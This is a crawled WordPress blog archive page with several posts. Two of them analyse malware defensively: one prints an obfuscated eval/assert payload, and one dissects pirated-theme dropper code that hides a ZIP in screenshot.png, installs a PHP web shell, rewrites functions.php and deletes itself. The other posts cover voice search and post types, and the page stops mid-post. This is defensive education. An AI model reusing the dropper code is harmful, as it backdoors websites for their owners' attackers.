http://ottopress.com/tag/theme/page/2/
HTTP/1.1 200 OK
Server: nginx/1.4.4
Date: Wed, 23 Jul 2014 07:47:31 GMT
Content-Type: text/html; charset=UTF-8
Connection: close
X-Pingback: http://ottopress.com/xmlrpc.php

<!DOCTYPE html>
<html lang="en-US">

<head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />

<title>theme &raquo; Otto on WordPress</title>

<link rel="profile" href="http://www.w3.org/1999/xhtml/vocab" />
<link rel="me" type="text/html" href="https://plus.google.com/100201852715113506716" />

<link rel="stylesheet" href="http://ottopress.com/wp-content/themes/fluid-blue/style.css" type="text/css" media="screen" />
<link rel="stylesheet" href="http://ottopress.com/wp-content/themes/fluid-blue/print.css" type="text/css" media="print" />

<link rel="pingback" href="http://ottopress.com/xmlrpc.php" />

<meta property="og:email" content="otto@ottodestruct.com" />
<meta http-equiv="X-UA-Compatible" content="chrome=1">

<script type="text/javascript">var description = '';</script>
<!-- Jetpack Site Verification Tags -->
<meta name="google-site-verification" content="IvlRFnRHu9RIiAiOS-bo-8vU4ju4V6_b4U3M_-1jlXQ" />
<link rel="alternate" type="application/rss+xml" title="Otto on WordPress &raquo; Feed" href="http://ottopress.com/feed/" />
<link rel="alternate" type="application/rss+xml" title="Otto on WordPress &raquo; Comments Feed" href="http://ottopress.com/comments/feed/" />
<link rel="alternate" type="application/rss+xml" title="Otto on WordPress &raquo; theme Tag Feed" href="http://ottopress.com/tag/theme/feed/" />
<link rel='stylesheet' id='yarppWidgetCss-css'  href='http://ottopress.com/wp-content/plugins/yet-another-related-posts-plugin/style/widget.css?ver=3.9.1' type='text/css' media='all' />
<link rel='stylesheet' id='jetpack-subscriptions-css'  href='http://ottopress.com/wp-content/plugins/jetpack/modules/subscriptions/subscriptions.css?ver=3.9.1' type='text/css' media='all' />
<link rel='stylesheet' id='the-neverending-homepage-css'  href='http://ottopress.com/wp-content/plugins/jetpack/modules/infinite-scroll/infinity.css?ver=20140422' type='text/css' media='all' />
<link rel='stylesheet' id='tiled-gallery-css'  href='http://ottopress.com/wp-content/plugins/jetpack/modules/tiled-gallery/tiled-gallery/tiled-gallery.css?ver=2012-09-21' type='text/css' media='all' />
<link rel='stylesheet' id='mediaelement-css'  href='http://ottopress.com/wp-includes/js/mediaelement/mediaelementplayer.min.css?ver=2.13.0' type='text/css' media='all' />
<link rel='stylesheet' id='wp-mediaelement-css'  href='http://ottopress.com/wp-includes/js/mediaelement/wp-mediaelement.css?ver=3.9.1' type='text/css' media='all' />
<script type='text/javascript' src='http://ottopress.com/wp-includes/js/jquery/jquery.js?ver=1.11.0'></script>
<script type='text/javascript' src='http://ottopress.com/wp-includes/js/jquery/jquery-migrate.js?ver=1.2.1'></script>
<script type='text/javascript' src='http://ottopress.com/wp-content/plugins/jetpack/modules/tiled-gallery/tiled-gallery/tiled-gallery.js?ver=3.9.1'></script>
<script type='text/javascript' src='http://ottopress.com/wp-content/plugins/jetpack/_inc/spin.js?ver=1.3'></script>
<script type='text/javascript' src='http://ottopress.com/wp-content/plugins/jetpack/_inc/jquery.spin.js?ver=1.3'></script>
<link rel="EditURI" type="application/rsd+xml" title="RSD" href="http://ottopress.com/xmlrpc.php?rsd" />
<link rel="wlwmanifest" type="application/wlwmanifest+xml" href="http://ottopress.com/wp-includes/wlwmanifest.xml" /> 
<meta name="generator" content="WordPress 3.9.1" />
<meta name="pinterest" content="nopin" /><link rel="microsummary" type="text/plain" href="/tag/theme/page/2/?microsummary=1" /><link rel="shortcut icon" href="http://ottopress.com/wp-content/wp-logo-vs.png" /><style type="text/css" id="syntaxhighlighteranchor"></style>
<script type="text/javascript">

  var _gaq = _gaq || [];
  _gaq.push(['_setAccount', 'UA-27538437-1']);
  _gaq.push(['_trackPageview']);

  (function() {
    var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
    ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
    var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
  })();

</script>
</head>

<body class="archive paged tag tag-theme tag-604 paged-2 tag-paged-2 infinite-scroll neverending">
<script type="text/javascript">
if (top.location != self.location) top.location.replace(self.location);
</script>
<div id="page">
<div id="header">
	<div id="headertitle">
		<h1><a href="http://ottopress.com" title="Otto on WordPress: You have to use an Ottopress to get fresh squeezed Otto.">Otto on WordPress</a></h1>
		<p>You have to use an Ottopress to get fresh squeezed Otto.</p>
	</div> 
	<!-- Search box (If you prefer having search form as a sidebar widget, remove this block) -->
	<div class="search">
		<form method="get" id="searchform" action="http://ottopress.com/">
<input type="search" size="20" results="5" name="s" id="s" placeholder="Search..." speech="speech" x-webkit-speech="x-webkit-speech" onwebkitspeechchange="this.form.submit();" />
</form>
	</div> 
	<!-- Search ends here-->
		
</div>
<div id="navbar">
<div id="nav">
<div class="menu"><ul><li ><a href="http://ottopress.com/">Home</a></li><li class="page_item page-item-5 page_item_has_children"><a href="http://ottopress.com/wordpress-plugins/">WordPress Plugins</a><ul class='children'><li class="page_item page-item-205"><a href="http://ottopress.com/wordpress-plugins/atd-for-comments/">After The Deadline For Comments</a></li><li class="page_item page-item-21"><a href="http://ottopress.com/wordpress-plugins/atom-default-feed/">Atom Default Feed</a></li><li class="page_item page-item-965"><a href="http://ottopress.com/wordpress-plugins/dropbox-photo-sideloader/">Dropbox Photo Sideloader</a></li><li class="page_item page-item-15"><a href="http://ottopress.com/wordpress-plugins/gravatar-box/">Gravatar Box</a></li><li class="page_item page-item-32"><a href="http://ottopress.com/wordpress-plugins/php-code-widget/">PHP Code Widget</a></li><li class="page_item page-item-7"><a href="http://ottopress.com/wordpress-plugins/simple-facebook-connect/">Simple Facebook Connect</a></li><li class="page_item page-item-10"><a href="http://ottopress.com/wordpress-plugins/simple-twitter-connect/">Simple Twitter Connect</a></li><li class="page_item page-item-81"><a href="http://ottopress.com/wordpress-plugins/unicornify/">Unicornify</a></li></ul></li><li class="page_item page-item-374"><a href="http://ottopress.com/contact/">Contact Otto</a></li><li><a href="http://ottodestruct.com" title="Nothing to See Here">Nothing to See Here</a></li><li><a href="http://buyottoabeer.com" title="Otto on Beer">Otto on Beer</a></li></ul></div>
	</div>
</div>
<div id="wrapper">
	<div id="content">

	
			<p>Posts tagged &#8216;theme&#8217;</p>

	 		
		<div class="navigation">
			<div class="alignleft"><a href="http://ottopress.com/tag/theme/page/3/" >&laquo; Previous Entries</a></div>
			<div class="alignright"><a href="http://ottopress.com/tag/theme/" >Next Entries &raquo;</a></div>
		</div>

					<div id="post-446" class="post-446 post type-post status-publish format-standard hentry category-code category-wordpress tag-eval tag-evil tag-malware tag-pharma tag-securi tag-theme" itemprop="blogPosts" itemscope itemtype="http://schema.org/BlogPosting">
				<h2 class="posttitle"><a href="http://ottopress.com/2011/scanning-for-malicious-code-is-pointless/" rel="bookmark" title="Permanent Link to &#8220;Scanning&#8221; for Malicious Code is Pointless" itemprop="url"><span itemprop="name">&#8220;Scanning&#8221; for Malicious Code is Pointless</span></a></h2>
				<div class="postmetadata">March 8, 2011, 12:46 pm <!-- by <span rel="author">Samuel “Otto” Wood</span> --></div>
				<div class="postentry" itemprop="description">
					<p><img class="alignright size-thumbnail wp-image-447" title="Arms_Race" src="http://i0.wp.com/ottopress.com/files/2011/03/Arms_Race.jpg?resize=200%2C200" alt="" data-recalc-dims="1" />In the WordPress world, security is always a prime concern, and for obvious reasons. It&#8217;s a major target for spammers, what with 30 million sites and what have you. So there&#8217;s a lot of <a title="WordPress Extend - Search for &quot;Security&quot;" href="http://wordpress.org/extend/plugins/search.php?q=security">security plugins</a> to do scanning on your files, there&#8217;s <a title="WordPress File Monitor" href="http://wordpress.org/extend/plugins/wordpress-file-monitor/">file monitor plugins</a> which work by simply noticing changes to the files of any sort, we do scans in the theme check process, etc.</p>
<p>I&#8217;ve gotten a few responses back to some of my <a title="Anatomy of a Theme Malware" href="http://ottopress.com/2010/anatomy-of-a-theme-malware/">malware related posts</a> asking why WordPress doesn&#8217;t check for this sort of thing in the core code. Why can&#8217;t WordPress check for the existence of &#8220;eval&#8221; and such in a plugin before it runs it? Well, I&#8217;ll show you.</p>
<p><a href="http://blog.sucuri.net/2010/07/understanding-and-cleaning-the-pharma-hack-on-wordpress.html">Securi covered the &#8220;Pharma&#8221; attack</a> several months ago, but nobody seemed to notice the important bit of code that shows why WordPress can&#8217;t do scanning in core. Fact of the matter is that the hacks have already gone well beyond scanning for strings and such.</p>
<p>Take this code for example:</p>
<pre class="brush: php; title: ; notranslate" title="">
&lt;?php $XZKsyG='as';$RqoaUO='e';$ygDOEJ=$XZKsyG.'s'.$RqoaUO.'r'.'t';$joEDdb='b'.$XZKsyG.$RqoaUO.(64).'_'.'d'.$RqoaUO.'c'.'o'.'d'.$RqoaUO;@$ygDOEJ(@$joEDdb(long long string here)..
</pre>
<p>What does that do? Well, in short, that&#8217;s an eval(base64_decode()); Here it is again, broken down with newlines and such:</p>
<pre class="brush: php; title: ; notranslate" title="">
$XZKsyG='as';
$RqoaUO='e';
$ygDOEJ=$XZKsyG.'s'.$RqoaUO.'r'.'t';
$joEDdb='b'.$XZKsyG.$RqoaUO.(64).'_'.'d'.$RqoaUO.'c'.'o'.'d'.$RqoaUO;
@$ygDOEJ(@$joEDdb(long long string here)..
</pre>
<p>Those third and fourth lines are important, so lets fill in the two variables there with the &#8216;as&#8217; and &#8216;e&#8217; from above it:</p>
<pre class="brush: php; title: ; notranslate" title="">
$ygDOEJ='as'.'s'.'e'.'r'.'t';
$joEDdb='b'.'as'.'e'.(64).'_'.'d'.'e'.'c'.'o'.'d'.'e';
</pre>
<p>And we have &#8220;assert&#8221; and &#8220;base64_decode&#8221; once again. The <a title="PHP Manual for assert()" href="http://php.net/manual/en/function.assert.php">assert</a> function will also evaluate strings as PHP code, BTW. It&#8217;s really just an eval in another form.</p>
<p>The final line uses something about PHP that some people may not know. If I have a variable with a string in it, then I can call a function with that strings name by using the variable instead of the function name. In other words, this works:</p>
<pre class="brush: php; title: ; notranslate" title="">
function do_something() { }
$var = 'do_something';
$var();
</pre>
<p>Now tell me, how you gonna scan for something like that?</p>
<p>Determining whether a piece of code is malicious or not is basically equivalent to the <a title="Halting Problem on Wikipedia" href="http://en.wikipedia.org/wiki/Halting_problem">halting problem</a>. You can&#8217;t do it programmatically. Not really. If WP added code to the core to try to detect and stop this sort of thing, the spammers would simply modify their code so that the core couldn&#8217;t detect it anymore.</p>
<p>Why get into an arms race? It&#8217;s better to concentrate on making WordPress itself secure and to try to educate both users and hosts about good security practices. Most hacked sites get hacked via insecure server configurations, not through WordPress itself.</p>
<p>So scanning is pointless. So why do we still do it for <a title="Theme Check" href="http://wordpress.org/extend/plugins/theme-check/">theme check</a> and such? Because not all malicious code is as cleverly written, and so some basic scanning is indeed somewhat effective. And the goal there is simply to weed out the problems. All of the WordPress.org theme checking is done by human eyeballs, the scanning tools just ensure a minimal level of theme capabilities and make pruning that much quicker.</p>
				</div>

<div style="clear:both;"><span class="post-shortlink">Shortlink: 
<input type='text' value='http://otto42.com/92' onclick='this.focus(); this.select();' />
</span></div>

				<div class="postmetadata">
					Tags: <a href="http://ottopress.com/tag/eval/" rel="tag">eval</a>, <a href="http://ottopress.com/tag/evil/" rel="tag">evil</a>, <a href="http://ottopress.com/tag/malware/" rel="tag">malware</a>, <a href="http://ottopress.com/tag/pharma/" rel="tag">pharma</a>, <a href="http://ottopress.com/tag/securi/" rel="tag">securi</a>, <a href="http://ottopress.com/tag/theme/" rel="tag">theme</a><br />					Category: <a href="http://ottopress.com/category/code/" title="View all posts in Code" rel="category tag">Code</a>, <a href="http://ottopress.com/category/wordpress/" title="View all posts in WordPress" rel="category tag">WordPress</a>&nbsp;&nbsp;|&nbsp;
					<a href="http://ottopress.com/2011/scanning-for-malicious-code-is-pointless/#comments" title="Comment on &#8220;Scanning&#8221; for Malicious Code is Pointless">15 Comments</a>									 </div>
			</div>			<div id="post-397" class="post-397 post type-post status-publish format-standard hentry category-code category-wordpress tag-chrome tag-html tag-html5 tag-php tag-search tag-searchform tag-theme tag-voice tag-wordpress-2" itemprop="blogPosts" itemscope itemtype="http://schema.org/BlogPosting">
				<h2 class="posttitle"><a href="http://ottopress.com/2011/wp-quickie-adding-chrome-voice-search/" rel="bookmark" title="Permanent Link to WP Quickie: Adding Chrome Voice Search" itemprop="url"><span itemprop="name">WP Quickie: Adding Chrome Voice Search</span></a></h2>
				<div class="postmetadata">January 5, 2011, 11:35 pm <!-- by <span rel="author">Samuel “Otto” Wood</span> --></div>
				<div class="postentry" itemprop="description">
					<p>Saw <a href="http://googlesystem.blogspot.com/2011/01/voice-search-for-google-chrome.html">this post</a> about Chrome voice searching in HTML forms on Google&#8217;s blog today. Very cool, so I had to give it a try. If you check the &#8220;Search&#8221; box in the upper right corner of the page, you&#8217;ll see a little icon (if you&#8217;re using a dev version of Chrome). Click it to do a search-by-voice.</p>
<p>What I didn&#8217;t expect was how totally easy it is to implement. Seriously, it&#8217;s less than a line of code.</p>
<p><img src="http://i2.wp.com/ottopress.com/files/2011/01/voicesearch.png?resize=292%2C189" alt="" title="Voice Searching" class="size-full wp-image-400" data-recalc-dims="1" /></p>
<p>Example. Say your search box (possibly in your theme&#8217;s searchform.php file) looks like this:</p>
<pre class="brush: php; title: ; notranslate" title="">
&lt;form id=&quot;searchform&quot; action=&quot;&lt;?php bloginfo('home'); ?&gt;/&quot; method=&quot;get&quot;&gt;
&lt;input id=&quot;s&quot; name=&quot;s&quot; size=&quot;20&quot; type=&quot;text&quot; value=&quot;&lt;?php _e('Search') ?&gt;...&quot; /&gt;
&lt;/form&gt;
</pre>
<p>All you have to do is to add some bits to the input element box. Specifically, you add <em>x-webkit-speech speech onwebkitspeechchange=&#8221;this.form.submit();&#8221;</em>. That&#8217;s it. Seriously:</p>
<pre class="brush: php; title: ; notranslate" title="">
&lt;form id=&quot;searchform&quot; action=&quot;&lt;?php bloginfo('home'); ?&gt;/&quot; method=&quot;get&quot;&gt;
&lt;input id=&quot;s&quot; name=&quot;s&quot; size=&quot;20&quot; type=&quot;text&quot; value=&quot;&lt;?php _e('Search') ?&gt;...&quot; x-webkit-speech speech onwebkitspeechchange=&quot;this.form.submit();&quot; /&gt;
&lt;/form&gt;
</pre>
<p>Note that this won&#8217;t validate, if you care about that sort of thing. Works fine though.</p>
<p>You can do <a href="http://www.w3.org/2005/Incubator/htmlspeech/2010/10/google-api-draft.html">a whole lot more</a> with Javascript and events and translations and multiple choices and such, if you&#8217;re thinking of developing something cool with it. I&#8217;m just shocked and amazed that this is already in my browser and I had no idea it was there. Very cool.</p>
				</div>

<div style="clear:both;"><span class="post-shortlink">Shortlink: 
<input type='text' value='http://otto42.com/8w' onclick='this.focus(); this.select();' />
</span></div>

				<div class="postmetadata">
					Tags: <a href="http://ottopress.com/tag/chrome/" rel="tag">chrome</a>, <a href="http://ottopress.com/tag/html/" rel="tag">html</a>, <a href="http://ottopress.com/tag/html5/" rel="tag">html5</a>, <a href="http://ottopress.com/tag/php/" rel="tag">PHP</a>, <a href="http://ottopress.com/tag/search/" rel="tag">search</a>, <a href="http://ottopress.com/tag/searchform/" rel="tag">searchform</a>, <a href="http://ottopress.com/tag/theme/" rel="tag">theme</a>, <a href="http://ottopress.com/tag/voice/" rel="tag">voice</a>, <a href="http://ottopress.com/tag/wordpress-2/" rel="tag">WordPress</a><br />					Category: <a href="http://ottopress.com/category/code/" title="View all posts in Code" rel="category tag">Code</a>, <a href="http://ottopress.com/category/wordpress/" title="View all posts in WordPress" rel="category tag">WordPress</a>&nbsp;&nbsp;|&nbsp;
					<a href="http://ottopress.com/2011/wp-quickie-adding-chrome-voice-search/#comments" title="Comment on WP Quickie: Adding Chrome Voice Search">17 Comments</a>									 </div>
			</div>			<div id="post-355" class="post-355 post type-post status-publish format-standard hentry category-code category-wordpress tag-bad tag-evil tag-malware tag-spam tag-theme tag-top-themes" itemprop="blogPosts" itemscope itemtype="http://schema.org/BlogPosting">
				<h2 class="posttitle"><a href="http://ottopress.com/2010/anatomy-of-a-theme-malware/" rel="bookmark" title="Permanent Link to Anatomy of a Theme Malware" itemprop="url"><span itemprop="name">Anatomy of a Theme Malware</span></a></h2>
				<div class="postmetadata">December 9, 2010, 12:55 pm <!-- by <span rel="author">Samuel “Otto” Wood</span> --></div>
				<div class="postentry" itemprop="description">
					<p>As I&#8217;ve gotten involved with helping the WordPress.org theme review team, I&#8217;ve seen some strange things. One of the stranger ones was a theme virus that actually propagated from one theme to all others in a WordPress installation. That one was awfully clever, but it ultimately didn&#8217;t really do anything but propagate and generally be a pain in the ass.</p>
<p><img class="alignright size-thumbnail wp-image-357" title="redhazard" src="http://i2.wp.com/ottopress.com/files/2010/12/redhazard.png?resize=200%2C200" alt="" data-recalc-dims="1" />However, today, @chip_bennett discovered that <a href="http://wordpress.org/extend/themes/oenology">one of his themes</a> had been copied and was being redistributed by a site called top-themes.com.</p>
<p>It had malware inserted into it that is of a much more malicious and spammy nature. Further investigation reveals that ALL of the themes on that site contain basically the same code. This code is not actually &#8220;viral&#8221;, but it&#8217;s definitely malware and it&#8217;s worth investigating to see some of the ways people try to hide their spam.</p>
<p>So today, I&#8217;m going to dissect it and serve it up on a platter for everybody to see.</p>
<h3>Infection Point</h3>
<p>We&#8217;ll start with the most obvious starting point, and that is in the functions.php file. At the very end of the functions.php file, we find a call to &#8220;get_custom_headers();&#8221;. An innocuous enough sounding name, so we go find that function. Here&#8217;s the first part of the function:</p>
<pre class="brush: php; title: ; notranslate" title="">
function get_custom_headers() {
    $_SESSION['authenticated'] = false;
    $filename = dirname(__FILE__).DS.&quot;screenshot.png&quot;;
</pre>
<p>Right away, something is wrong. It&#8217;s getting the location of the screenshot file (DS is defined elsewhere as the Directory Separator, which makes it work on both Linux and Windows boxes). That doesn&#8217;t make a whole lot of sense, the screenshot is supposed to be displayed by the admin interface only. Let&#8217;s read on.</p>
<pre class="brush: php; title: ; notranslate" title="">
    $fileContents = explode(pack(&quot;c*&quot;, 0xAE,0x42,0x60,0x82), file_get_contents($filename));
    $screenshot = array_shift($fileContents);
</pre>
<p>The &#8220;pack&#8221; function is one that isn&#8217;t used much. It&#8217;s a means of manipulating binary files. The &#8220;explode&#8221; function is a way of splitting a string by some characters. So what this code really is doing is to find a particular string of hex digits in the screenshot file, split it across that boundary, and then get only the first part of that (the actual screenshot file), thanks to the array shift. This gets used later.</p>
<p>In other words, he&#8217;s appended something onto the end of the screenshot file, and this code reads it in, finds it, then gets a copy of it. What could this be? Turns out to be a ZIP file.</p>
<pre class="brush: php; title: ; notranslate" title="">
    $unzipped = false;
    $path = check_istalled_path($_SERVER['DOCUMENT_ROOT']);
</pre>
<p>The check_istalled_path function looks for a wp-additional directory and returns a path to it.</p>
<pre class="brush: php; title: ; notranslate" title="">
    if($path === false &amp;&amp; $_SERVER['HTTP_HOST'] != &quot;localhost&quot; &amp;&amp; $_SERVER['SERVER_ADDR'] != &quot;127.0.0.1&quot;) {
	if(function_exists(&quot;zip_read&quot;)) {
	    $path = array_pop(array_shuffle(find_writeble_path($_SERVER['DOCUMENT_ROOT'])));
	    @mkdir($path = $path.DS.&quot;wp-additional&quot;);

	    file_put_contents($path.DS.&quot;archive.zip&quot;, implode(pack(&quot;c*&quot;, 0xAE,0x42,0x60,0x82), $fileContents));
	    $zip = new ZipArchive;
	    if ($zip-&gt;open($path.DS.&quot;archive.zip&quot;)===true) {

		$zip-&gt;extractTo($path.DS);
		$zip-&gt;close();
		unlink($path.DS.&quot;archive.zip&quot;);
		$unzipped = true;
	    }
	    @file_put_contents(dirname(__FILE__).DS.&quot;functions.php&quot;,&quot;&lt;!--?php  if(is_readable(\&quot;$path&quot;.DS.&quot;wshell.php\&quot;)) { @require_once(\&quot;$path&quot;.DS.&quot;wshell.php\&quot;); } ?--&gt;\n&quot;.file_get_contents(dirname(__FILE__).DS.&quot;functions.php&quot;));
	}
</pre>
<p>If the zip_read function is available, he makes a wp-additional directory and puts the ZIP file there. Then he simply unzips the malware file into the target theme. This requires a bit of explanation.</p>
<p>Elsewhere there is a function called &#8220;find_writeble_path&#8221;. This function doesn&#8217;t limit itself to the current theme&#8217;s directory. Instead, it looks through all installed themes on the system and tries to find all themes that has permissions set to allow it to be written to. So in all of the above, he&#8217;s really looking for any theme that he can infect with the malware contained in this archive. The &#8220;array_shuffle&#8221; line is his way of picking a random theme.</p>
<p>So he unzips the malware to that theme then adds code to himself to that makes it try to read and execute this wshell.php file.</p>
<p>But if the wp-additional directory full of malware has already been created somewhere on the system, then the above code doesn&#8217;t run. If it finds the malware directory, then it skips that and just does the following:</p>
<pre class="brush: php; title: ; notranslate" title="">
    } else {
	if($_SERVER['HTTP_HOST'] != &quot;localhost&quot; &amp;&amp; $_SERVER['SERVER_ADDR'] != &quot;127.0.0.1&quot;) {
	    $path = $_SERVER['DOCUMENT_ROOT'].DS.$path;
	    @file_put_contents(dirname(__FILE__).DS.&quot;functions.php&quot;,&quot;&lt;!--?php if(is_readable(\&quot;$path&quot;.DS.&quot;wshell.php\&quot;)) { @require_once(\&quot;$path&quot;.DS.&quot;wshell.php\&quot;); } ?--&gt;\n&quot;.file_get_contents(dirname(__FILE__).DS.&quot;functions.php&quot;));
	}
    }
</pre>
<p>It found the malware, so it simply rewrites itself to make sure it includes it.</p>
<p>The overall affect of the above code is to make the them unzip the malware into any theme directory it can find, then rewrite itself to attempt to include it.</p>
<p>Next we have self-eliminating code:</p>
<pre class="brush: php; title: ; notranslate" title="">
    @file_put_contents(__FILE__, array_shift(explode(&quot;function get_custom_headers&quot;, file_get_contents(__FILE__))));
    @file_put_contents(dirname(__FILE__).DS.&quot;screenshot.png&quot;, $screenshot);
</pre>
<p>What does this code do? Well, it erases itself from the file!</p>
<p>This code reads the file that the malware code is in right now (with file_get_contents(__FILE__) ). Then it explodes it along the get_custom_headers function. Finally, it writes it back out to the file itself.</p>
<p>Basically, using the explode and array_shift method, it finds the get_custom_headers function code, then writes the functions.php back out <em>without</em> that code or anything after it. Now that the malware has done its job, this code basically self deletes, to make it not traceable. All that&#8217;s left is the wp-additional directory that contains the malware, and the include it wrote to the beginning of the file to load that malware.</p>
<p>Here&#8217;s where it also erases itself from the screenshot, using the $screenshot variable it saved earlier.</p>
<pre class="brush: php; title: ; notranslate" title="">
    if(function_exists(&quot;zip_read&quot;) &amp;&amp; $unzipped == true &amp;&amp; $_SERVER['HTTP_HOST'] != &quot;localhost&quot; &amp;&amp; $_SERVER['SERVER_ADDR'] != &quot;127.0.0.1&quot;) {
	@require_once($path.DS.&quot;wshell.php&quot;);
    }
}
</pre>
<p>This just makes it load the now-decompressed wshell.php malware immediately, instead of waiting for the next page load.</p>
<p>Also note how the code doesn&#8217;t run on localhost installs? If you look closely, the self-removing code does run on those installs. Meaning that if you run this theme in a test bed, then it removes itself without infection. This is to make it harder for people to analyse the code, since it disappears the first time you run it on a local test system.</p>
<h3>The Malware</h3>
<p>So what is this malware? Well, there&#8217;s two parts to it.</p>
<p>The first part is a standard PHP Shell install, essentially giving a shell backdoor to anybody who knows the location of the malware and the username and password. This is a massive security hole, obviously.</p>
<p>The second part is somewhat custom. It&#8217;s in the wshell.php file that the above malware tries so hard to get you to include. Essentially, this installs a spamming system of fairly wide ranging scope.</p>
<p>The first thing it does is to notify its master that it exists. It does this by making a connection to 188.165.212.17 and sending what looks sorta like SMTP commands, but which are probably customized in some way. But basically it tells this server where it&#8217;s installed and how it can be accessed. After it gets confirmation, it sets a parameter to make it not send this again.</p>
<p>The spamming system itself contains a number of commands. The way it gets commands from the attacker is by looking for them in cookies with a name of &#8220;wsh-cmd&#8221;. So in this sense, it&#8217;s kind of like a server. The attacker has some kind of a client that talks to your server via the normal HTTP, but sends it hidden commands via this cookie.</p>
<p>The commands allow the attacker to view a list of writable files in your themes directory, and to view any specified readable file on the system. It avoids triggering mod_security systems by base64 encoding files that it sends around. But the main thrust of the system is to allow the attacker to insert links into, and remove links from, any writable theme file.</p>
<p>Essentially, it&#8217;s a remote-controlled automated link spamming tool.</p>
<p>The attacker can send URLs to your system and it will insert them into theme files. He can later remove those links. There&#8217;s a lot of code to allow it to generate proper links, to insert them into specific lines, things of that nature.</p>
<h3>Summary</h3>
<p>In short, don&#8217;t trust dodgy theme sites. Get your free themes from <a href="http://wordpress.org/extend/themes">WordPress.org Extend-Themes</a> instead.</p>
<p>Also, this sort of thing should tell you why we ban certain types of things from the WordPress.org theme repository. We can&#8217;t scan for specific malware, as it&#8217;s too easy to get around that sort of scanning. Scanning for functions that most of these malwares use is simpler and more effective. And all of our themes go through human-eye review as well, with anything even slightly dodgy getting brought up before a mailing list of experts who can take a look and determine what is what.</p>
				</div>

<div style="clear:both;"><span class="post-shortlink">Shortlink: 
<input type='text' value='http://otto42.com/8m' onclick='this.focus(); this.select();' />
</span></div>

				<div class="postmetadata">
					Tags: <a href="http://ottopress.com/tag/bad/" rel="tag">bad</a>, <a href="http://ottopress.com/tag/evil/" rel="tag">evil</a>, <a href="http://ottopress.com/tag/malware/" rel="tag">malware</a>, <a href="http://ottopress.com/tag/spam/" rel="tag">spam</a>, <a href="http://ottopress.com/tag/theme/" rel="tag">theme</a>, <a href="http://ottopress.com/tag/top-themes/" rel="tag">top-themes</a><br />					Category: <a href="http://ottopress.com/category/code/" title="View all posts in Code" rel="category tag">Code</a>, <a href="http://ottopress.com/category/wordpress/" title="View all posts in WordPress" rel="category tag">WordPress</a>&nbsp;&nbsp;|&nbsp;
					<a href="http://ottopress.com/2010/anatomy-of-a-theme-malware/#comments" title="Comment on Anatomy of a Theme Malware">49 Comments</a>									 </div>
			</div>			<div id="post-306" class="post-306 post type-post status-publish format-standard hentry category-wordpress tag-authors tag-categories tag-post-formats tag-tags tag-taxonomies tag-theme" itemprop="blogPosts" itemscope itemtype="http://schema.org/BlogPosting">
				<h2 class="posttitle"><a href="http://ottopress.com/2010/post-types-and-formats-and-taxonomies-oh-my/" rel="bookmark" title="Permanent Link to Post types and formats and taxonomies, oh my!" itemprop="url"><span itemprop="name">Post types and formats and taxonomies, oh my!</span></a></h2>
				<div class="postmetadata">November 12, 2010, 11:00 am <!-- by <span rel="author">Samuel “Otto” Wood</span> --></div>
				<div class="postentry" itemprop="description">
					<p>A lot of people have been debating back and forth lately about post formats and custom post formats. This discussion also gets all confused with post types, and custom taxonomies, and categories, and tags&#8230; It&#8217;s time for some clarity. Mark had a <a href="http://markjaquith.wordpress.com/2010/11/12/post-formats-vs-custom-post-types/">really good post</a> on the topic, but I think this needs to be explored in more detail.</p>
<p>Also, can&#8217;t have a good explanation without a bad analogy. I mean, this is the <em>internet</em>, right? So I should probably try to relate it to cars somehow.</p>
<h3>A Post Type as a Car</h3>
<p>Okay, so let&#8217;s say we have a post type. It&#8217;s called &#8220;car&#8221;. Anything that even vaguely resembles a car (including trucks, SUVs, jeeps, fire engines) gets lumped together in this post type.</p>
<p>We can categorize cars by type: Truck. Van. Hummer. Ford. Whatever.</p>
<p>We can add tags to cars: Four-door. Premium-sound. 6-disc-changer. Etc.</p>
<p>We can come up with custom taxonomies for them: A Color taxonomy could contain red, blue, black, silver, white, brown, etc.</p>
<p>The point here is that the post type is the thing itself, the various taxonomies are merely descriptions of it. You wouldn&#8217;t have both a &#8220;car&#8221; and a &#8220;truck&#8221; post type, because those are the same type of thing. If you prefer to be generic, you could make your post_type into &#8220;automobile&#8221;, which sorta fits both. That&#8217;s just a matter of naming choice.</p>
<p>Post types are <strong>NOUNS</strong>. Taxonomy terms are <strong>ADJECTIVES</strong>. Taxonomies themselves are <strong>related groups of adjectives</strong>.</p>
<p>This is why people using post types for things like Podcasts or Comic Strips or Video or something else are just fundamentally wrong. They&#8217;re using different nouns to describe the same thing, when they should be using the adjectives to sort out what those things are.</p>
<h3>Displaying Different Things Differently</h3>
<p>Historically with WordPress, categories have been used for more than just ways to classify posts. They&#8217;ve often been used to define different ways of displaying something.</p>
<p>The classic example is an &#8220;aside&#8221;. An aside has been traditionally defined as, basically, a short form post. <a href="http://ma.tt">Matt</a> loves asides and he uses them far more often than long format posts:</p>
<div id="attachment_307" style="width: 780px" class="wp-caption alignnone"><a href="http://i2.wp.com/ottopress.com/files/2010/11/mattaside.png"><img class="size-full wp-image-307" title="mattaside" src="http://i1.wp.com/ottopress.com/files/2010/11/mattaside.png?resize=700%2C371" alt="A couple of aside posts on ma.tt" data-recalc-dims="1" /></a><p class="wp-caption-text">A couple of aside posts on ma.tt</p></div>
<p>Matt also uses a special format for his gallery posts:</p>
<div id="attachment_309" style="width: 784px" class="wp-caption alignnone"><a href="http://i1.wp.com/ottopress.com/files/2010/11/mattgallery.png"><img class="size-full wp-image-309" title="mattgallery" src="http://i2.wp.com/ottopress.com/files/2010/11/mattgallery.png?resize=700%2C338" alt="One of ma.tt's gallery posts" data-recalc-dims="1" /></a><p class="wp-caption-text">One of ma.tt&#39;s gallery posts</p></div>
<p>Compare these to his normal long format posts:</p>
<div id="attachment_308" style="width: 782px" class="wp-caption alignnone"><a href="http://i1.wp.com/ottopress.com/files/2010/11/mattessay.png"><img class="size-full wp-image-308" title="mattessay" src="http://i1.wp.com/ottopress.com/files/2010/11/mattessay.png?resize=700%2C221" alt="A normal long format post on ma.tt" data-recalc-dims="1" /></a><p class="wp-caption-text">A normal long format post on ma.tt</p></div>
<p>You can easily see some of the differences. Asides don&#8217;t display a title. Galleries display a photo on the left hand side and the title is shortened and to the right. Long format posts have that double line underneath them, and also show the categories (essays in the above case).</p>
<p>The way he does these, and the way they have traditionally been done in WordPress in the past, is to co-opt categories. So he has an &#8220;Asides&#8221; category, and a &#8220;Gallery&#8221; category. In the code for his theme, he then has code that looks kinda like this:</p>
